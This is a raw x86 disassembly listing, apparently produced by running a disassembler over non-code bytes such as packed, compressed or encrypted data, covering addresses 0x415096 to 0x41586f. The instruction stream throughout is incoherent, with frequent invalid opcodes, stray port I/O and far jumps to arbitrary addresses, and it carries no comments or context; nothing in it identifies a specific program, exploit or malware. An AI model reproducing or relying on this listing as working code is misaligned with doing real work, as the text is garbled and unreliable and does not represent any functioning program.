  415096:	sub    al,0xd5
  415098:	retf   0xe988
  41509b:	mov    dh,0x55
  41509d:	sbb    al,0xa6
  41509f:	dec    edi
  4150a1:	not    DWORD PTR [ebp-0x24a1d321]
  4150a7:	sbb    edx,ebp
  4150a9:	ins    DWORD PTR es:[edi],dx
  4150aa:	pop    esi
  4150ab:	adc    BYTE PTR [ecx+0x24],0x6b
  4150af:	fwait
  4150b0:	xchg   ebx,eax
  4150b1:	adc    DWORD PTR [eax-0x18],esp
  4150b4:	data16 ja 0x4150ba
  4150b7:	xchg   BYTE PTR [esi],dl
  4150b9:	xchg   ebp,eax
  4150ba:	jnp    0x415126
  4150bc:	lahf   
  4150bd:	mov    ebx,0xcf73b171
  4150c2:	daa    
  4150c3:	mov    ecx,0x2c86d513
  4150c8:	lahf   
  4150c9:	or     bl,dl
  4150cb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4150cd:	cs mov dh,0xb0
  4150d0:	mov    ecx,0x619a6c58
  4150d5:	rcl    BYTE PTR [ebx+eiz*8],0x8d
  4150d9:	jnp    0x415083
  4150db:	sbb    al,0xfb
  4150dd:	test   eax,0xb1b4fd8e
  4150e2:	cmp    DWORD PTR [esi+0x11def4e7],0xffffffd9
  4150e9:	js     0x415099
  4150eb:	nop
  4150ec:	mov    bl,0x17
  4150ee:	fxch   st(7)
  4150f0:	jmp    0x2601964a
  4150f5:	sub    edx,edi
  4150f7:	mov    ds:0xf7f98add,al
  4150fc:	imul   edx,DWORD PTR [ebx+eax*4],0xd950ec1f
  415103:	js     0x415140
  415105:	sbb    edi,DWORD PTR [ebx-0x73]
  415108:	mov    edx,DWORD PTR [eax]
  41510a:	xchg   esp,eax
  41510b:	clc    
  41510c:	ins    BYTE PTR es:[edi],dx
  41510d:	mov    esi,0x39e62c09
  415113:	sahf   
  415114:	dec    ebp
  415115:	sub    DWORD PTR [eax+0x7ac4c2c1],0xffffffbd
  41511c:	or     bh,BYTE PTR [edx-0x61]
  41511f:	fyl2x  
  415121:	loop   0x4150ea
  415123:	sub    DWORD PTR [ecx+0x74],eax
  415126:	adc    DWORD PTR [edx+0x4],ebx
  415129:	cld    
  41512a:	jne    0x415131
  41512c:	fld    st(5)
  41512e:	pop    esp
  41512f:	xchg   edx,eax
  415130:	cmp    esi,ecx
  415132:	mov    DWORD PTR [ecx-0x5a575cfe],eax
  415138:	call   0x6f63728b
  41513d:	mov    al,ds:0xca01cd04
  415142:	int3   
  415143:	push   ebp
  415144:	enter  0xbd1,0xe
  415148:	push   cs
  415149:	stos   DWORD PTR es:[edi],eax
  41514a:	aam    0x39
  41514c:	xlat   BYTE PTR ds:[ebx]
  41514d:	push   edi
  41514e:	jmp    0x2092a29b
  415153:	test   al,0x71
  415155:	outs   dx,BYTE PTR ds:[esi]
  415156:	jmp    0x896e:0x5b0672a6
  41515d:	and    al,0xfc
  41515f:	nop
  415160:	call   0x5c42f9ab
  415165:	push   ebx
  415166:	dec    ecx
  415167:	fiadd  WORD PTR [ecx]
  415169:	xchg   esi,eax
  41516a:	or     eax,0x9331165f
  41516f:	mov    cs,WORD PTR [esi+0x27]
  415172:	mov    fs,WORD PTR [ebp+0x7fe30b74]
  415178:	jmp    0x3c8f:0xb831be84
  41517f:	lea    esp,[eax]
  415181:	int3   
  415182:	in     al,0x29
  415184:	cmp    ecx,DWORD PTR [ebp+eiz*8+0x15]
  415188:	mov    edi,0x842f7e47
  41518d:	xchg   edx,eax
  41518e:	jge    0x415207
  415190:	jmp    0x1156d3b3
  415195:	mov    bh,0x22
  415197:	mov    ebp,0x374e1c65
  41519c:	das    
  41519d:	aaa    
  41519e:	sub    ch,dl
  4151a0:	mov    WORD PTR [esi-0x79042b51],?
  4151a6:	cdq    
  4151a7:	gs sti 
  4151a9:	lds    ecx,FWORD PTR [ecx-0x7c]
  4151ac:	mov    eax,ds:0x2f5631ed
  4151b1:	pop    ds
  4151b2:	pop    ebx
  4151b3:	ret    
  4151b4:	out    dx,al
  4151b5:	mov    al,ds:0x425134b8
  4151ba:	or     al,0x47
  4151bc:	jae    0x4151f2
  4151be:	mov    bx,0x4d58
  4151c2:	xchg   edx,eax
  4151c3:	out    0xce,al
  4151c5:	mov    eax,0x6d367ef
  4151ca:	in     al,dx
  4151cb:	loopne 0x4151d0
  4151cd:	cli    
  4151ce:	push   esp
  4151cf:	sbb    eax,ecx
  4151d1:	xchg   ebx,ecx
  4151d3:	(bad)  
  4151d5:	or     ebp,DWORD PTR [esp+ebp*8]
  4151d8:	and    ecx,DWORD PTR [ebp+0x15]
  4151db:	fldcw  WORD PTR [eax-0x6f16d0e6]
  4151e1:	or     BYTE PTR [ecx-0x641630c1],0x4e
  4151e8:	sbb    eax,0x1d8eb201
  4151ed:	fdivr  DWORD PTR ds:0x2d746d53
  4151f3:	shr    al,1
  4151f5:	cld    
  4151f6:	(bad)  
  4151f7:	in     eax,dx
  4151f8:	jo     0x41522e
  4151fa:	test   eax,0x161bd7b9
  4151ff:	aam    0xdd
  415201:	dec    ebx
  415202:	rep ins BYTE PTR es:[edi],dx
  415204:	inc    ecx
  415205:	sub    ecx,0x39e8b701
  41520b:	adc    al,bl
  41520d:	js     0x415285
  41520f:	push   esi
  415210:	xor    DWORD PTR [edi*4+0x384e8b44],edx
  415217:	adc    eax,0xf76d216f
  41521c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41521d:	pop    ds
  41521e:	imul   esi,DWORD PTR [edi],0xffffffc7
  415221:	push   DWORD PTR [ecx+0x316e89a1]
  415227:	add    eax,0x20737765
  41522c:	mov    edx,0x84be5f46
  415231:	sub    esi,ebp
  415233:	xor    ebp,DWORD PTR [eax+0x1e]
  415236:	fcmovnbe st,st(7)
  415238:	xor    eax,DWORD PTR [esi+0x59]
  41523b:	in     al,dx
  41523c:	std    
  41523d:	call   0x61c3:0x4b66e3c7
  415244:	js     0x415253
  415246:	aam    0x18
  415248:	inc    esi
  415249:	mov    eax,ds:0xe5003006
  41524e:	xor    eax,0x4805e96f
  415253:	mov    bl,0xd8
  415255:	lods   eax,DWORD PTR ds:[esi]
  415256:	push   0x9
  415258:	pushf  
  415259:	mov    ebp,DWORD PTR [edi+0x6ac4bf8]
  41525f:	mov    esp,esi
  415261:	and    ebx,DWORD PTR [ebp-0x78]
  415264:	mov    bl,0x2e
  415266:	adc    BYTE PTR [ebx],0xef
  415269:	in     al,0x6c
  41526b:	dec    esi
  41526c:	sbb    al,0xa0
  41526e:	(bad)  
  41526f:	mov    ebx,0x1571c58a
  415274:	sub    edx,DWORD PTR [eax]
  415276:	mov    ch,0xe4
  415278:	xchg   ebx,eax
  415279:	ja     0x415229
  41527b:	in     eax,0xec
  41527d:	pop    ecx
  41527e:	pop    ecx
  41527f:	fiadd  DWORD PTR [ebx+0x3e]
  415282:	mov    DWORD PTR [ecx],ebp
  415284:	enter  0x1d10,0x14
  415288:	mov    ds:0x6200171c,eax
  41528d:	popa   
  41528e:	popa   
  41528f:	lds    esp,FWORD PTR [esp+ecx*2+0x227f1063]
  415296:	mov    esi,0xe9129d32
  41529b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41529c:	xchg   ecx,eax
  41529d:	mov    al,ds:0x9b134352
  4152a2:	aam    0x21
  4152a4:	shl    DWORD PTR [eax],1
  4152a6:	pop    ds
  4152a7:	repnz lahf 
  4152a9:	push   ecx
  4152aa:	xor    al,0x46
  4152ac:	dec    ebx
  4152ad:	data16 in al,0xba
  4152b0:	pop    ecx
  4152b1:	repnz (bad) 
  4152b3:	xchg   esp,eax
  4152b4:	push   0x51a690a8
  4152b9:	jg     0x415293
  4152bb:	ret    
  4152bc:	pop    esp
  4152bd:	xor    BYTE PTR [eax+0x20d8b2e2],bh
  4152c3:	lods   eax,DWORD PTR ds:[esi]
  4152c4:	sub    al,0xf5
  4152c6:	jmp    0x4152c8
  4152c8:	jl     0x415302
  4152ca:	push   eax
  4152cb:	fist   DWORD PTR [eax-0x6]
  4152ce:	dec    edx
  4152cf:	lds    ebx,FWORD PTR [edi+0x4d]
  4152d2:	out    0x9d,eax
  4152d4:	inc    ebx
  4152d5:	shl    BYTE PTR [edx+0x67ec4e03],0xaa
  4152dc:	gs cmp eax,0x5db5bb1b
  4152e2:	aas    
  4152e3:	loop   0x415291
  4152e5:	sbb    ah,dh
  4152e7:	ror    DWORD PTR [ecx-0x2ab73fc7],1
  4152ed:	or     ecx,edx
  4152ef:	or     eax,0x439f0638
  4152f4:	mov    esp,0xd18a3c20
  4152f9:	pusha  
  4152fa:	jbe    0x415368
  4152fc:	out    0xf9,eax
  4152fe:	sti    
  4152ff:	aaa    
  415300:	popf   
  415301:	loope  0x41529a
  415303:	add    DWORD PTR [ebx+0x5fdf83de],0x7d
  41530a:	das    
  41530b:	repnz mov ebx,0x256396e5
  415311:	add    DWORD PTR [esi],ebp
  415313:	nop
  415314:	fbld   TBYTE PTR [ebx+0x77b4243c]
  41531a:	cwde   
  41531b:	cld    
  41531c:	scas   al,BYTE PTR es:[edi]
  41531d:	std    
  41531e:	inc    eax
  41531f:	aas    
  415320:	sbb    esp,edi
  415322:	in     al,0x69
  415324:	in     al,dx
  415325:	push   esp
  415326:	xchg   ecx,eax
  415327:	into   
  415328:	inc    eax
  415329:	mov    ah,0x8e
  41532b:	xchg   ebx,eax
  41532c:	lock int3 
  41532e:	add    ch,BYTE PTR [edi]
  415330:	cs push edx
  415332:	mov    dh,0xf8
  415334:	or     ecx,DWORD PTR [ebp+0x209dddf8]
  41533a:	mov    ds:0x3f0a1dae,al
  41533f:	mov    al,BYTE PTR [ecx-0x3ded1ca0]
  415345:	push   eax
  415346:	(bad)  
  415347:	pop    edx
  415348:	adc    eax,0x96077819
  41534d:	cmp    DWORD PTR [ecx+0x37395d51],eax
  415353:	nop
  415354:	dec    eax
  415355:	test   BYTE PTR [esi+0x55],bl
  415358:	mov    bl,0xcb
  41535a:	addr16 sub al,0x67
  41535d:	aas    
  41535e:	out    dx,eax
  41535f:	iret   
  415360:	cmp    al,0x8a
  415362:	(bad)  
  415363:	outs   dx,DWORD PTR ds:[esi]
  415364:	and    BYTE PTR [eax-0x63],al
  415367:	in     al,0x82
  415369:	or     al,0x8c
  41536b:	cmp    eax,0x8c24d7bd
  415370:	jae    0x415348
  415372:	add    DWORD PTR [edx+0x1aa888f9],ebp
  415378:	inc    ebp
  415379:	les    esp,FWORD PTR [eax+0x621c1182]
  41537f:	push   eax
  415380:	stc    
  415381:	out    dx,al
  415382:	lahf   
  415383:	pushf  
  415384:	adc    ah,BYTE PTR [ecx+0x2b]
  415387:	push   0x8a542f75
  41538c:	fdivrp st(3),st
  41538e:	add    ah,ah
  415390:	cli    
  415391:	ins    BYTE PTR es:[di],dx
  415393:	pop    edi
  415394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415395:	cmp    eax,DWORD PTR [esi-0x42af86de]
  41539b:	mov    ds:0x7a0afa9f,al
  4153a0:	jb     0x4153bb
  4153a2:	xchg   ebx,eax
  4153a3:	jne    0x415370
  4153a5:	cli    
  4153a6:	sub    BYTE PTR [edx-0x15],dl
  4153a9:	jbe    0x4153b6
  4153ab:	or     eax,eax
  4153ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153ae:	pop    ecx
  4153af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b0:	mov    ch,0x5b
  4153b2:	ret    0x79f8
  4153b5:	and    eax,0x44c264fc
  4153ba:	and    BYTE PTR [ebp-0x45de52bd],cl
  4153c0:	sbb    DWORD PTR [ebx+ecx*2+0x7f],ebp
  4153c4:	pushf  
  4153c5:	pusha  
  4153c6:	cld    
  4153c7:	and    ebp,DWORD PTR fs:[ebx+0x3e]
  4153cb:	test   ch,bl
  4153cd:	mov    ebp,0xe35d2759
  4153d2:	ja     0x4153c1
  4153d4:	sti    
  4153d5:	push   es
  4153d6:	add    DWORD PTR [edi],edi
  4153d8:	pusha  
  4153d9:	cmp    eax,0xa23bd21f
  4153de:	imul   eax,DWORD PTR [edx-0x2b],0x52
  4153e2:	xchg   esp,eax
  4153e3:	xchg   al,dh
  4153e5:	test   eax,0x84008679
  4153ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153eb:	cmp    eax,DWORD PTR [ecx]
  4153ed:	enter  0xfb3c,0x5
  4153f1:	aaa    
  4153f2:	inc    esp
  4153f3:	jns    0x4153fd
  4153f5:	add    cl,ch
  4153f7:	sti    
  4153f8:	sti    
  4153f9:	mov    cl,0x53
  4153fb:	(bad)  
  4153fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153fe:	enter  0x138c,0x7f
  415402:	mov    ebp,0x9f0e180d
  415407:	pop    edi
  415408:	clc    
  415409:	mov    ebp,0xb6c4d1dc
  41540e:	and    dl,BYTE PTR [edx+esi*4+0x2611e418]
  415415:	dec    edx
  415416:	clc    
  415417:	adc    al,0xcf
  415419:	push   ebx
  41541a:	inc    BYTE PTR [ecx]
  41541c:	dec    esp
  41541d:	push   0x20
  41541f:	fcomp  DWORD PTR [ebx+0x39]
  415422:	jecxz  0x415465
  415424:	mov    bh,0xfb
  415426:	aaa    
  415427:	std    
  415428:	in     eax,0xb5
  41542a:	sub    eax,0x3a3d0704
  41542f:	pop    es
  415430:	xor    BYTE PTR [ebx],0xed
  415433:	aad    0xff
  415435:	mov    fs,WORD PTR [ebx+0x5]
  415438:	dec    eax
  415439:	stc    
  41543a:	jmp    0xe8ef5733
  41543f:	cld    
  415440:	pop    ebp
  415441:	mov    ds,WORD PTR [eax-0x3d]
  415444:	lds    esi,FWORD PTR [ebx+0x1774b8fe]
  41544a:	daa    
  41544b:	stos   BYTE PTR es:[edi],al
  41544c:	sub    BYTE PTR [ebx],0x85
  41544f:	add    cl,BYTE PTR [esi]
  415451:	cli    
  415452:	adc    esp,DWORD PTR [ecx+0x45]
  415455:	fs mov ah,0xb6
  415458:	xor    ah,bh
  41545a:	jo     0x41545d
  41545c:	call   0x5835:0x82dc5d3b
  415463:	jl     0x415463
  415465:	push   esp
  415466:	sbb    BYTE PTR [edx],bh
  415468:	dec    esp
  415469:	xchg   BYTE PTR [ebp-0x74],al
  41546c:	ins    BYTE PTR es:[edi],dx
  41546d:	cmp    DWORD PTR [edx-0x4e5dad77],ebp
  415473:	ja     0x4154cf
  415475:	shl    BYTE PTR [ebx-0x4f062022],cl
  41547b:	cdq    
  41547c:	je     0x415412
  41547e:	outs   dx,DWORD PTR ds:[esi]
  41547f:	ficomp DWORD PTR [edi+0x535c39a2]
  415485:	mov    ecx,0xa7fee83d
  41548a:	jecxz  0x41547f
  41548c:	ror    dl,0x1e
  41548f:	pop    ds
  415490:	sti    
  415491:	push   ds
  415492:	ja     0x41543b
  415494:	mov    ch,0x80
  415496:	inc    edx
  415497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415498:	out    dx,eax
  415499:	jl     0x415477
  41549b:	icebp  
  41549c:	call   0xabf04f0f
  4154a1:	pop    es
  4154a2:	dec    edx
  4154a3:	inc    ebp
  4154a4:	call   DWORD PTR [ebx+0x3ad704b3]
  4154aa:	test   BYTE PTR [ebx-0x52],ch
  4154ad:	dec    edx
  4154ae:	jl     0x41545d
  4154b0:	hlt    
  4154b1:	lahf   
  4154b2:	or     eax,0xb22a5b6a
  4154b7:	and    ah,BYTE PTR ds:0x7cc78fc3
  4154bd:	ins    BYTE PTR es:[edi],dx
  4154be:	and    al,0x5c
  4154c0:	and    al,0x78
  4154c2:	mov    BYTE PTR [edx-0x5c],bh
  4154c5:	dec    ebp
  4154c6:	and    al,0x62
  4154c8:	sub    eax,0xa94fff58
  4154cd:	xchg   ebx,eax
  4154ce:	push   es
  4154cf:	mov    ss,WORD PTR ds:0xac6f7219
  4154d5:	test   DWORD PTR [ebx+ebp*8+0x725879eb],ebp
  4154dc:	dec    esi
  4154dd:	jnp    0x4154b6
  4154df:	jne    0x415467
  4154e1:	cmp    DWORD PTR ds:0x94c45bb1,0xcf168c5c
  4154eb:	mov    esi,0xd2548494
  4154f0:	cmp    dl,BYTE PTR [edx+0x23]
  4154f3:	clc    
  4154f4:	shl    bl,1
  4154f6:	cmp    BYTE PTR [ebp-0x63f978e4],dl
  4154fc:	add    eax,0x97128049
  415501:	fdiv   DWORD PTR [eax+0x5072fe23]
  415507:	mov    dl,0x8b
  415509:	adc    eax,DWORD PTR [esi]
  41550b:	int    0x94
  41550d:	inc    ebx
  41550e:	or     esi,DWORD PTR [edi+0x47400a2f]
  415514:	jne    0x415536
  415516:	ja     0x41557b
  415518:	mov    ebx,0xbec9f3d2
  41551d:	cmp    DWORD PTR [esi],eax
  41551f:	adc    al,0xcf
  415521:	stos   BYTE PTR es:[edi],al
  415522:	pop    es
  415523:	repz adc BYTE PTR [ebx+0x118937f5],0x23
  41552b:	dec    edx
  41552c:	sub    ebp,DWORD PTR [eax-0x18ab3a15]
  415532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415533:	fisub  WORD PTR [edi+0x57]
  415536:	out    dx,eax
  415537:	push   esi
  415538:	repnz xor ecx,esi
  41553b:	or     ah,BYTE PTR [ebx-0x3e56ef35]
  415541:	dec    edx
  415542:	ds add eax,0xb230ea9e
  415548:	push   cs
  415549:	push   eax
  41554a:	es pop ds
  41554c:	test   al,0x33
  41554e:	outs   dx,DWORD PTR ds:[esi]
  41554f:	leave  
  415550:	pop    esi
  415551:	in     eax,0x26
  415553:	ja     0x4154fb
  415555:	push   cs
  415556:	pop    ecx
  415557:	mov    al,ds:0x8835654e
  41555c:	inc    edx
  41555d:	mov    dl,0x9a
  41555f:	push   edi
  415560:	mov    ds,WORD PTR [ecx]
  415562:	jle    0x41551e
  415564:	jmp    0x2feb:0x2026c49d
  41556b:	ja     0x41551f
  41556d:	adc    ebp,DWORD PTR [edi+0x70]
  415570:	mov    esi,0x522faa91
  415575:	aas    
  415576:	sub    DWORD PTR [eax-0x35],edi
  415579:	xor    ecx,DWORD PTR [edx+0x1930cb0b]
  41557f:	mov    cl,0x4f
  415581:	push   0xf7d7505d
  415586:	push   0x47
  415588:	stos   BYTE PTR es:[edi],al
  415589:	jge    0x415515
  41558b:	gs sub eax,eax
  41558e:	lahf   
  41558f:	mov    eax,ds:0x42f6bb75
  415594:	loope  0x415543
  415596:	(bad)  [ebp+0x45]
  415599:	dec    esp
  41559a:	neg    DWORD PTR [edi-0x31]
  41559d:	dec    ecx
  41559e:	popf   
  41559f:	dec    edx
  4155a0:	pusha  
  4155a1:	lahf   
  4155a2:	mov    ?,WORD PTR [edx-0x2e38fa90]
  4155a8:	repz mov al,ds:0xfa40bbe7
  4155ae:	(bad)  
  4155af:	stc    
  4155b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155b1:	and    BYTE PTR [ecx],dh
  4155b3:	push   DWORD PTR [edx+edx*4-0x2a]
  4155b7:	pop    esi
  4155b8:	xor    DWORD PTR ds:0x6cadd17f,0xffffffc5
  4155bf:	cmp    DWORD PTR [ebp+0x6],esi
  4155c2:	xchg   dh,ch
  4155c4:	out    dx,eax
  4155c5:	and    ch,ah
  4155c7:	shr    BYTE PTR [edx],cl
  4155c9:	mov    eax,ds:0xc95b7cbe
  4155ce:	loop   0x41558f
  4155d0:	dec    esp
  4155d1:	sbb    eax,0xec401765
  4155d6:	rol    DWORD PTR [eax+ebx*1+0x383b772b],0x73
  4155de:	push   ecx
  4155df:	push   ds
  4155e0:	ss mov ch,0x71
  4155e3:	inc    ebx
  4155e4:	ds in  eax,0x34
  4155e7:	add    DWORD PTR [ecx],ebx
  4155e9:	and    dh,ch
  4155eb:	icebp  
  4155ec:	pop    ss
  4155ed:	int3   
  4155ee:	sbb    ch,dl
  4155f0:	jmp    0x4077cc5c
  4155f5:	js     0x415623
  4155f7:	sbb    al,0xba
  4155f9:	scas   eax,DWORD PTR es:[edi]
  4155fa:	adc    bh,BYTE PTR [esi]
  4155fc:	xlat   BYTE PTR ds:[ebx]
  4155fd:	inc    edi
  4155fe:	pop    ds
  4155ff:	cmp    ebp,DWORD PTR [eax-0x15582d0f]
  415605:	arpl   di,di
  415607:	mov    BYTE PTR [ebx],dh
  415609:	jb     0x41560f
  41560b:	sub    DWORD PTR [edx+0x6b],edx
  41560e:	in     eax,dx
  41560f:	pop    esp
  415610:	(bad)  
  415611:	jge    0x4155b6
  415613:	aad    0xc8
  415615:	add    DWORD PTR [ebx-0x26],esi
  415618:	jnp    0x4155de
  41561a:	(bad)  
  41561b:	fnstenv [ecx]
  41561d:	jle    0x415666
  41561f:	push   ecx
  415620:	ds jmp 0x660735c7
  415626:	call   0x892b0425
  41562b:	and    BYTE PTR [ebx+eiz*2-0x50],ah
  41562f:	add    DWORD PTR [ebx+eiz*2+0x13],esi
  415633:	and    al,0x38
  415635:	in     eax,0x35
  415637:	fcmovu st,st(7)
  415639:	add    esp,DWORD PTR [eax+edi*2-0x72]
  41563d:	xchg   ecx,eax
  41563e:	pop    ebp
  41563f:	add    eax,0x200c9cb5
  415644:	xchg   ebp,eax
  415645:	(bad)  
  415646:	cmp    ebx,edx
  415648:	xchg   edx,eax
  415649:	xchg   edx,eax
  41564a:	add    ecx,DWORD PTR [edi+0x6e]
  41564d:	sbb    DWORD PTR [edx],edx
  41564f:	jo     0x4155e8
  415651:	out    dx,eax
  415652:	je     0x4156a9
  415654:	nop
  415655:	jecxz  0x41564f
  415657:	test   al,0x6b
  415659:	jle    0x415607
  41565b:	jae    0x415683
  41565d:	jns    0x415655
  41565f:	fwait
  415660:	xchg   ecx,eax
  415661:	into   
  415662:	push   edx
  415663:	or     bh,BYTE PTR [edx]
  415665:	test   DWORD PTR [ebx-0x38a51817],edi
  41566b:	mov    al,ds:0xd4a50dc0
  415670:	adc    ebx,DWORD PTR [esi-0x32]
  415673:	popf   
  415674:	mov    eax,ebx
  415676:	or     al,0x54
  415678:	or     dh,BYTE PTR [edx-0x6d51265e]
  41567e:	mov    dh,0x40
  415680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415681:	sub    BYTE PTR [edx+0x65],ah
  415684:	sbb    al,0x8
  415686:	fsub   st(7),st
  415688:	jg     0x41568b
  41568a:	sub    DWORD PTR [ebx],ebx
  41568c:	adc    DWORD PTR ds:[ebx+0x6],eax
  415690:	jns    0x41562b
  415692:	push   ebp
  415693:	xlat   BYTE PTR ds:[ebx]
  415694:	xchg   edi,eax
  415695:	mov    bh,0xaa
  415697:	fadd   QWORD PTR [esi]
  415699:	aad    0xfb
  41569b:	(bad)  
  41569c:	rcr    DWORD PTR [ecx+0x64ec575e],cl
  4156a2:	dec    ebp
  4156a3:	fwait
  4156a4:	jp     0x4156a0
  4156a6:	push   0x1e
  4156a8:	jg     0x415673
  4156aa:	mov    BYTE PTR [esi+0x6c],bh
  4156ad:	inc    eax
  4156ae:	retf   
  4156af:	ins    DWORD PTR es:[edi],dx
  4156b0:	loop   0x415710
  4156b2:	outs   dx,BYTE PTR ds:[esi]
  4156b3:	xchg   edi,eax
  4156b4:	fwait
  4156b5:	into   
  4156b6:	stos   BYTE PTR es:[edi],al
  4156b7:	ss loope 0x415655
  4156ba:	fimul  WORD PTR [edi+ecx*4]
  4156bd:	xchg   ecx,eax
  4156be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156bf:	imul   edi,DWORD PTR ds:[edi],0x37b32600
  4156c6:	pop    ebx
  4156c7:	scas   al,BYTE PTR es:[edi]
  4156c8:	out    0xa9,eax
  4156ca:	mov    gs,WORD PTR [ebx+0x5b]
  4156cd:	das    
  4156ce:	data16 lahf 
  4156d0:	shr    DWORD PTR [ebx],cl
  4156d2:	and    BYTE PTR [eax-0x416bd02],ch
  4156d8:	jmp    0x5b87:0xf25ec589
  4156df:	nop
  4156e0:	adc    al,0xaf
  4156e2:	xor    BYTE PTR [eax+0x2ce1a5bc],dh
  4156e8:	mov    bh,0x96
  4156ea:	mov    edx,0xb268eba1
  4156ef:	push   ebx
  4156f0:	adc    cl,dl
  4156f2:	xor    eax,0xa2d56534
  4156f7:	inc    ebp
  4156f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f9:	dec    ecx
  4156fa:	mov    eax,0xe3147666
  4156ff:	jl     0x4156bf
  415701:	repz pop esp
  415703:	mov    al,ds:0x9f92fe56
  415708:	outs   dx,BYTE PTR ds:[esi]
  415709:	mov    ah,0x92
  41570b:	jl     0x415755
  41570d:	push   ss
  41570e:	cmp    eax,0x8197b37f
  415713:	retf   
  415714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415715:	in     al,dx
  415716:	loop   0x4156af
  415718:	pop    edx
  415719:	push   edx
  41571a:	or     al,0xc5
  41571c:	std    
  41571d:	aad    0x75
  41571f:	dec    edx
  415720:	sbb    bh,BYTE PTR [eax-0x5b]
  415723:	test   BYTE PTR [ecx-0x3],ah
  415726:	sub    esp,DWORD PTR [esi]
  415728:	out    dx,al
  415729:	imul   ebp,ebp,0x588ad754
  41572f:	mov    ah,0xb4
  415731:	lahf   
  415732:	outs   dx,DWORD PTR ds:[esi]
  415733:	and    DWORD PTR [esp+ebx*2-0x12],esi
  415737:	dec    ebx
  415738:	inc    esp
  415739:	adc    DWORD PTR [edi],esp
  41573b:	mov    DWORD PTR [ebp+0x37],edx
  41573e:	cld    
  41573f:	push   cs
  415740:	sti    
  415741:	aam    0x2e
  415743:	inc    edi
  415744:	xchg   ebp,eax
  415745:	(bad)  
  415746:	mov    BYTE PTR [edx-0x77],dl
  415749:	pusha  
  41574a:	iret   
  41574b:	adc    eax,DWORD PTR [edi-0x25]
  41574e:	and    ecx,DWORD PTR [eax-0x10]
  415751:	jne    0x41578c
  415753:	stc    
  415754:	xor    BYTE PTR [ebp+0x1f],bl
  415757:	gs mov bh,0x1e
  41575a:	test   DWORD PTR [eax+eax*1+0xdae859d],ebx
  415761:	and    BYTE PTR [esi-0x44],bl
  415764:	cmp    eax,0xaddca397
  415769:	sub    bh,BYTE PTR [eax-0x2d]
  41576c:	(bad)  
  41576e:	data16 js 0x41571c
  415771:	push   ebx
  415772:	call   0xba2121cb
  415777:	out    0xfd,al
  415779:	test   DWORD PTR [edx],ebx
  41577b:	jp     0x415785
  41577d:	push   esp
  41577e:	mov    edx,0x84472e08
  415783:	and    eax,0xbfd94fc2
  415788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415789:	xor    al,0xbf
  41578b:	jl     0x41574c
  41578d:	aad    0x37
  41578f:	je     0x415797
  415791:	sar    ebx,0xa3
  415794:	je     0x41578e
  415796:	dec    esi
  415797:	mov    ebp,0x5c3ed65a
  41579c:	(bad)  
  41579d:	jg     0x415782
  41579f:	jle    0x4157ff
  4157a1:	ret    0x9bd
  4157a4:	xor    bh,dh
  4157a6:	daa    
  4157a7:	push   ebx
  4157a8:	mov    ebx,0x65fd074e
  4157ad:	pushf  
  4157ae:	es loopne 0x415749
  4157b1:	sti    
  4157b2:	icebp  
  4157b3:	cmp    BYTE PTR [ebp+0x23e568ac],bh
  4157b9:	xor    DWORD PTR [ebp+0x17],ebx
  4157bc:	popf   
  4157bd:	es rol cl,cl
  4157c0:	pushf  
  4157c1:	jl     0x4157f9
  4157c3:	(bad)
  4157c8:	sub    esp,DWORD PTR [ebp-0xa27bb01]
  4157ce:	fild   QWORD PTR [ebx+0xee85c65]
  4157d4:	jns    0x415801
  4157d6:	(bad)  
  4157d7:	fisubr DWORD PTR fs:[edi-0x12]
  4157db:	test   edx,ebp
  4157dd:	ret    
  4157de:	dec    ecx
  4157df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157e0:	push   eax
  4157e1:	mov    esi,0x832a0533
  4157e6:	xchg   esi,eax
  4157e7:	add    dh,bh
  4157e9:	add    eax,0x1f7881df
  4157ee:	daa    
  4157ef:	sbb    bl,BYTE PTR [ecx+0x6b]
  4157f2:	jmp    0x300803b
  4157f7:	in     al,dx
  4157f8:	ins    BYTE PTR es:[edi],dx
  4157f9:	add    bl,bl
  4157fb:	stos   BYTE PTR es:[edi],al
  4157fc:	retf   0x89aa
  4157ff:	xor    BYTE PTR [ecx-0x10],0xdd
  415803:	add    ecx,DWORD PTR [esi-0x72be9c27]
  415809:	clc    
  41580a:	dec    ebp
  41580b:	(bad)  
  41580c:	call   0x2c675ffb
  415811:	ja     0x415877
  415813:	ror    BYTE PTR [ecx],1
  415815:	iret   
  415816:	mov    ds:0x73a547f7,eax
  41581b:	mov    DWORD PTR [eax+esi*4],0xdedcd05
  415822:	jne    0x415813
  415824:	cmp    ch,0x64
  415827:	leave  
  415828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415829:	fisttp QWORD PTR [ebx]
  41582b:	aaa    
  41582c:	push   ecx
  41582d:	out    0xf,al
  41582f:	fs dec ebp
  415831:	adc    eax,DWORD PTR [ebx+esi*4+0xa94452b]
  415838:	ss cli 
  41583a:	(bad)  
  41583b:	sbb    BYTE PTR [edi],0xc1
  41583e:	shl    BYTE PTR [ebx],1
  415840:	fdiv   QWORD PTR [esi-0x6a]
  415843:	xor    eax,0xb38a1422
  415848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415849:	pushf  
  41584a:	jg     0x415881
  41584c:	jmp    0x9b86:0x2940e7c0
  415853:	adc    DWORD PTR [ebx],esi
  415855:	ror    BYTE PTR [eax-0x4299ddf],cl
  41585b:	loopne 0x4158c7
  41585d:	add    edi,DWORD PTR [eax-0x49]
  415860:	and    esi,esp
  415862:	cmp    esi,DWORD PTR ds:0xcfd5f277
  415868:	fidiv  DWORD PTR [esi+0x37e58af3]
  41586e:	clc    
  41586f:	push   eax
